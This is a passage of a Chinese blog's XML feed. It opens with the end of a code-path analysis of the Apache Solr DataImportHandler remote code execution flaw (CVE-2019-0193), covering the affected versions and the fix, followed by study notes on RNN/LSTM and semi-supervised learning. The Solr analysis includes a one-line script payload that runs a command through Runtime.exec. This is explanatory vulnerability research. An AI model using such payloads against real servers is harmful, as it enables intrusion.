(requestParams.isDebug()) &#123;</span><br><span class="line">          <span class="keyword">if</span> (debugEnabled) &#123;</span><br><span class="line">            <span class="comment">// Synchronous request for the debug mode</span></span><br><span class="line">            importer.runCmd(requestParams, sw);</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// Asynchronous request for normal mode</span></span><br><span class="line">          <span class="keyword">if</span>(requestParams.getContentStream() == <span class="keyword">null</span> &amp;&amp; !requestParams.isSyncMode())&#123;</span><br><span class="line">            importer.runAsync(requestParams, sw);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            importer.runCmd(requestParams, sw);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (DataImporter.RELOAD_CONF_CMD.equals(command)) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    rsp.add(<span class="string">"status"</span>, importer.isBusy() ? <span class="string">"busy"</span> : <span class="string">"idle"</span>);</span><br><span class="line">    rsp.add(<span class="string">"importResponse"</span>, message);</span><br><span class="line">    rsp.add(<span class="string">"statusMessages"</span>, importer.getStatusMessages());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先会提取出request的参数，然后关键在第18-39行，如果是调试模式(requestParams.isDebug())，则同步执行importer，如果不是则异步执行，为了方便调试，可以把payload加一个<code>debug=true</code>参数，调试同步的分支：</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103165424861.png" alt="image-20191103165424861"></p><p>继续向下跟，<code>DataImporter#runCmd()</code>调用<code>DataImporter#doFullImport()</code>——因为我们参数是<code>command=full-import</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFullImport</span><span class="params">(DIHWriter writer, RequestInfo requestParams)</span> </span>&#123;</span><br><span class="line">    log.info(<span class="string">"Starting Full Import"</span>);</span><br><span class="line">    setStatus(Status.RUNNING_FULL_DUMP);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      DIHProperties dihPropWriter = createPropertyWriter();</span><br><span class="line">      setIndexStartTime(dihPropWriter.getCurrentTimestamp());</span><br><span class="line">      docBuilder = <span class="keyword">new</span> DocBuilder(<span class="keyword">this</span>, writer, dihPropWriter, requestParams);</span><br><span class="line">      checkWritablePersistFile(writer, dihPropWriter);</span><br><span class="line">      docBuilder.execute();</span><br><span class="line">      <span class="keyword">if</span> (!requestParams.isDebug())</span><br><span class="line">        cumulativeStatistics.add(docBuilder.importStatistics);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里大概就可以猜到问题在第9行——<code>docBuilder.execute()</code>了，导入的dataConfig时我们可以控制的，而config中可以自写js脚本，又想到Nashorn解析的js脚本能执行java命令，这就导致了本次的漏洞。</p><p>跟完后续的调用栈吧，sink点在<code>ScriptTransformer#initEngine()</code>的87行——<code>ScriptEngine#eval(String)</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">org.apache.solr.handler.dataimport.DocBuilder#doFullDump</span><br><span class="line">  DocBuilder#buildDocument(VariableResolver, DocWrapper, Map&lt;String,Object&gt;, EntityProcessorWrapper, boolean, ContextImpl)</span><br><span class="line">    DocBuilder#buildDocument(VariableResolver, DocWrapper, Map&lt;String,Object&gt;, EntityProcessorWrapper, boolean, ContextImpl, List&lt;EntityProcessorWrapper&gt;):L476</span><br><span class="line">      EntityProcessorWrapper#nextRow:L280</span><br><span class="line">        EntityProcessorWrapper#loadTransformers // 主力里面的第100-111行，如果发现script标签，则向transformers加入解析js的transformer</span><br><span class="line">        EntityProcessorWrapper#applyTransformer:L222</span><br><span class="line">          ScriptTransformer#transformRow:L52</span><br><span class="line">           ScriptTransformer#initEngine:L87</span><br><span class="line">             ScriptEngine#eval(String) //这里的string就是之前script里的内容</span><br><span class="line">           javax.script.Invocable#invokeFunction//这里调用之前func定义的内容，产生RCE</span><br></pre></td></tr></table></figure><p>值得注意的是，我们可以直接在<code>ScriptEngine#eval(String)</code>处就直接RCE，即将script直接换成如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">&lt;![CDATA[java.lang.Runtime.getRuntime().exec("calc");]]&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是这样程序日志会有报错，因为invokeFunction找不到，综上本文还是选择了定义函数的payload。</p><h1 id="影响范围和修复"><a href="#影响范围和修复" class="headerlink" title="影响范围和修复"></a>影响范围和修复</h1><p>此漏洞影响solr&lt;=8.1.1，对比8.2.0可以看到修复方案：</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202031725.png" alt="image-20191103202031725"></p><p>即dataConfig参数必须要dataConfigParam_enabled为True时才能使用，可以在配置或启动命令中设置<code>-Denable .dih.dataConfigParam=true</code></p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103202135491.png" alt="image-20191103202135491"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>8月份的一个洞了，一直忙到现在才看，本身漏洞不复杂，但其中附加调试和找javaWeb入口点的技巧值得学习。</p><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ul><li><p>CVE-2019-0193 APACHE SOLR 远程命令执行漏洞分析， <a href="https://kylingit.com/blog/cve-2019-0193-apache-solr远程命令执行漏洞分析/" target="_blank" rel="noopener">https://kylingit.com/blog/cve-2019-0193-apache-solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a> </p></li><li><p>详细分析Solr的CVE-2019-0193以及velocity模板注入新洞， <a href="https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ</a></p></li><li>Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析， <a href="https://paper.seebug.org/1009/" target="_blank" rel="noopener">https://paper.seebug.org/1009/</a> </li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;先到solr上下载jar和src，这里选择的版本为v8.1.0&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://anemone.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="http://anemone.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Solr" scheme="http://anemone.top/tags/Solr/"/>
    
  </entry>
  
  <entry>
    <title>RNN学习笔记</title>
    <link href="http://anemone.top/ml-RNN%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://anemone.top/ml-RNN学习笔记/</id>
    <published>2019-10-24T12:30:49.000Z</published>
    <updated>2019-11-03T12:42:06.817Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RNN"><a href="#RNN" class="headerlink" title="RNN"></a>RNN</h1><p>普通神经网络不能考虑之前一个单词对下一个单词的作用，即上下文，因此引入RNN。</p><p>RNN在中间层加入了memory，在每次传播后，将中间层输出存储到memory，在下一次传播时，将结果取出与原输入一起作为输入，之后再传出到下一层。</p><p>以下图为例，为了方便演示，将激活函数全部变为线性，并且权重设为1，假设一开始，输入矩阵$[1,1]^T$，那么会输出$[4,4]^T$，同时两个记忆体由0变为2（因为隐藏层的输出是2）</p><a id="more"></a><p><img src="/ml-RNN学习笔记/image-20191024154745435.png" alt="image-20191024154745435"></p><p>那么接下来，输入矩阵$[1,1]^T$，这次虽然输入是一样的，但是由于memory不同，而memory也是输入的一部分，因此隐藏层输出为$[6,6]^T$，最终出$[12,12]^T$</p><p><img src="/ml-RNN学习笔记/image-20191024155107906.png" alt="image-20191024155107906"></p><p>因此输入个向量序列后，大致会执行类似下图流程</p><p><img src="/ml-RNN学习笔记/image-20191024155320413.png" alt="image-20191024155320413"></p><p>可以将其变形为深度学习模型，即存在多个隐藏层</p><p>同时，其有如下变形</p><ul><li><p>Elman Network: memory存中间值</p></li><li><p>Jordan Network: memory存output值</p><p><img src="/ml-RNN学习笔记/image-20191024155515493.png" alt="image-20191024155515493"></p></li></ul><h1 id="Bidirectional-RNN"><a href="#Bidirectional-RNN" class="headerlink" title="Bidirectional RNN"></a>Bidirectional RNN</h1><p>同时train正向和反向的神经网络，结合两个网络的output结合得到最终output：</p><p><img src="/ml-RNN学习笔记/image-20191024155601826.png" alt="image-20191024155601826"></p><h1 id="Long-Short-term-Memory-LSTM"><a href="#Long-Short-term-Memory-LSTM" class="headerlink" title="Long Short-term Memory(LSTM)"></a>Long Short-term Memory(LSTM)</h1><p>如下图所示，对于记忆体增加三个闸门：</p><ul><li><p>Input Gate：控制其他神经元能否写入记忆体</p></li><li><p>Output Gate：控制其他神经元能否读取记忆体</p></li><li><p>Forget Gate：控制记忆体是否该格式化数据</p><p>因此该神经网络有四个输入，一个输出，是否开放Gate由网络学习得到</p></li></ul><p><img src="/ml-RNN学习笔记/image-20191024155929389.png" alt="image-20191024155929389"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>Machine Learning (Hung-yi Lee, NTU) ， <a href="https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49" target="_blank" rel="noopener">https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49</a> （图片来源，李老师讲的课真的很好，大家可以听听看）</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;RNN&quot;&gt;&lt;a href=&quot;#RNN&quot; class=&quot;headerlink&quot; title=&quot;RNN&quot;&gt;&lt;/a&gt;RNN&lt;/h1&gt;&lt;p&gt;普通神经网络不能考虑之前一个单词对下一个单词的作用，即上下文，因此引入RNN。&lt;/p&gt;&lt;p&gt;RNN在中间层加入了memory，在每次传播后，将中间层输出存储到memory，在下一次传播时，将结果取出与原输入一起作为输入，之后再传出到下一层。&lt;/p&gt;&lt;p&gt;以下图为例，为了方便演示，将激活函数全部变为线性，并且权重设为1，假设一开始，输入矩阵$[1,1]^T$，那么会输出$[4,4]^T$，同时两个记忆体由0变为2（因为隐藏层的输出是2）&lt;/p&gt;
    
    </summary>
    
      <category term="机器学习" scheme="http://anemone.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="机器学习" scheme="http://anemone.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="半监督" scheme="http://anemone.top/tags/%E5%8D%8A%E7%9B%91%E7%9D%A3/"/>
    
  </entry>
  
  <entry>
    <title>半监督机器学习模型学习笔记</title>
    <link href="http://anemone.top/ml-%E5%8D%8A%E7%9B%91%E7%9D%A3%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://anemone.top/ml-半监督机器学习学习笔记/</id>
    <published>2019-10-23T12:30:49.000Z</published>
    <updated>2019-11-03T12:42:17.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><p>半监督（Semi-supervised Learning）即输入小部分已标记数据和大部分未标记数据进行学习，以提升准确率的一类机器学习方法。</p><p>有两种用法：</p><ul><li>Transductive learning：无标记数据就是测试集本身</li><li>Inductive learning：无标记数据不是测试集 </li></ul><a id="more"></a><p>之所以有效果的原因：未标记的数据的特征是有价值的，例如下图，未标记的样本分布决定SVM的超平面怎么划：</p><p><img src="/ml-半监督机器学习学习笔记/1571834496021.png" alt="1571834496021"></p><p>但是这也不绝对，因为如果左下的数据点时狗的话那么平面就不是这样了，因此半监督不一定效果好，其关键在于假设是否符合实际。</p><h1 id="Semi-supervised-Generative-Model-生成式方法"><a href="#Semi-supervised-Generative-Model-生成式方法" class="headerlink" title="Semi-supervised Generative Model(生成式方法)"></a>Semi-supervised Generative Model(生成式方法)</h1><p>先给出初始值，接着计算无标记数据的$p\theta(C_1|x^u)$，再更新模型的$P(C_1)$和$\mu$，反复迭代直到算法收敛</p><p><img src="/ml-半监督机器学习学习笔记/image-20191024110951281.png" alt="image-20191024110951281"></p><h1 id="Self-training"><a href="#Self-training" class="headerlink" title="Self-training"></a>Self-training</h1><ol><li>用标记数据生成模型</li><li>用模型预测未标记数据</li><li>将部分预测的标记数据从未标记数据中移到已标记数据中，再回到第一步，这里移动的策略需要自己决定</li></ol><p><img src="/ml-半监督机器学习学习笔记/image-20191024111124407.png" alt="image-20191024111124407"></p><h1 id="Generative-Model-amp-Self-training"><a href="#Generative-Model-amp-Self-training" class="headerlink" title="Generative Model &amp; Self-training"></a>Generative Model &amp; Self-training</h1><p>Generative Model对未标记数据属于哪一类不是确定的，而是一个可能性，而Self-training对与未标记数据会给出属于哪一类，非黑即白。</p><p>对于神经网络来说，Generative Model不适用</p><p>对于直推学习来说，Self-trainging不适用（因为未标记的数据本身就是需要预测的，第一次已经能给出结果）</p><h1 id="Entropy-based-Regularization"><a href="#Entropy-based-Regularization" class="headerlink" title="Entropy-based Regularization"></a>Entropy-based Regularization</h1><p>Self-training的优化版，使其适用于神经网络，其思想是认为，如果$y^u$的分布较为集中，那么分类效果比较好，而若$y^u$分布不集中，则神经网络效果较差，因此再损失函数总增加E的度量，E为Entropy，表示了分布是否集中 </p><p><img src="/ml-半监督机器学习学习笔记/1571835087936.png" alt="1571835087936"></p><h1 id="Semi-supervised-SVM"><a href="#Semi-supervised-SVM" class="headerlink" title="Semi-supervised SVM"></a>Semi-supervised SVM</h1><p>枚举未标记的所有可能性，最大化margin和least error</p><p><img src="/ml-半监督机器学习学习笔记/image-20191024121420642.png" alt="image-20191024121420642"></p><h1 id="Smoothness-Assumption"><a href="#Smoothness-Assumption" class="headerlink" title="Smoothness Assumption"></a>Smoothness Assumption</h1><p>假设：如果$x_1$和$x_2$相似，那么$y_1$可能等于$y_2$，更准确的说，$x_1$和$x_2$在同一高密度的区域的区域上，那么它们可能一致（感觉很像基于密度的聚类算法）</p><p>又由于未标记样本的特征可以填充密度，理论上是有效的。</p><p>因此具体做法：先聚类，然后再Label</p><h2 id="Graph-based-Approach"><a href="#Graph-based-Approach" class="headerlink" title="Graph-based Approach"></a>Graph-based Approach</h2><p>将$x$视为点，在点之间连边，构成图，如果两点之间可达，那么认为两条数据是相似的。如下如，方块和三角虽然距离很近，但是由于它们不可达，因此它们不相似</p><p><img src="/ml-半监督机器学习学习笔记/1571836705037.png" alt="1571836705037"></p><p>有些时候，这些边是现成就有的，比如说论文之间的互相引用，网页间的超链接。</p><p>有些情况下是没有的，只能通过一些经验来构造边，比如使用k近邻，e-近邻（推荐），如下图所示，距离推荐使用Gaussian Radial Basis，只有靠近的点才会符合要求</p><p><img src="/ml-半监督机器学习学习笔记/1571837008739.png" alt="1571837008739"></p><p>该方法的优势在于赋予了标记数据“传染性”，其可以延边传播到所有类成员。劣势在于未标记数据要足够多，否则无法传递。</p><p>定量分析smoothness：</p><p><img src="/ml-半监督机器学习学习笔记/image-20191024115845979.png" alt="image-20191024115845979"></p><p>另外$S$可以通过矩阵运算得到，即计算L, W为图的邻接矩阵，D的对角线上的值为每行的和</p><p><img src="/ml-半监督机器学习学习笔记/image-20191024120650988.png" alt="image-20191024120650988"></p><p>在神经网络传播时，将S乘上权重$\lambda$加到损失函数上：</p><p><img src="/ml-半监督机器学习学习笔记/image-20191024121139659.png" alt="image-20191024121139659"></p><h1 id="Disagreement-based-method（基于分歧的方法）"><a href="#Disagreement-based-method（基于分歧的方法）" class="headerlink" title="Disagreement-based method（基于分歧的方法）"></a>Disagreement-based method（基于分歧的方法）</h1><p>首先提出多视图的概念，即一个数据对象在多个方面存在多个数据集，比如电影，就存在图像画面的数据集和声音的数据集（两个视图），因此对于多个方面（视图）建立多个模型。</p><p>多个模型间可以展开协同训练，即先在每个视图上，使用已标记的数据训练出分类器，让每一个分类器标记未标记的数据，选择最有把握的未标记样本赋予伪标记放入训练集，再将新的训练集给另一视图上的分类器训练，直到分类器结果不再变化。</p><p>该方法经过改造，可以用于单视图，仅需不同分类器就可提升效果。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><p>Machine Learning (Hung-yi Lee, NTU) ， <a href="https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49" target="_blank" rel="noopener">https://www.youtube.com/watch?v=CXgbekl66jc&amp;list=PLJV_el3uVTsPy9oCRY30oBPNLCo89yu49</a> （图片来源，李老师讲的课真的很好，大家可以听听看）</p></li><li><p>周志华. 机器学习[M]. 清华大学出版社, 2016. </p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;基本介绍&quot;&gt;&lt;a href=&quot;#基本介绍&quot; class=&quot;headerlink&quot; title=&quot;基本介绍&quot;&gt;&lt;/a&gt;基本介绍&lt;/h1&gt;&lt;p&gt;半监督（Semi-supervised Learning）即输入小部分已标记数据和大部分未标记数据进行学习，以提升准确率的一类机器学习方法。&lt;/p&gt;&lt;p&gt;有两种用法：&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;Transductive learning：无标记数据就是测试集本身&lt;/li&gt;
&lt;li&gt;Inductive learning：无标记数据不是测试集 &lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="机器学习" scheme="http://anemone.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="机器学习" scheme="http://anemone.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="半监督" scheme="http://anemone.top/tags/%E5%8D%8A%E7%9B%91%E7%9D%A3/"/>
    
  </entry>
  
</feed>
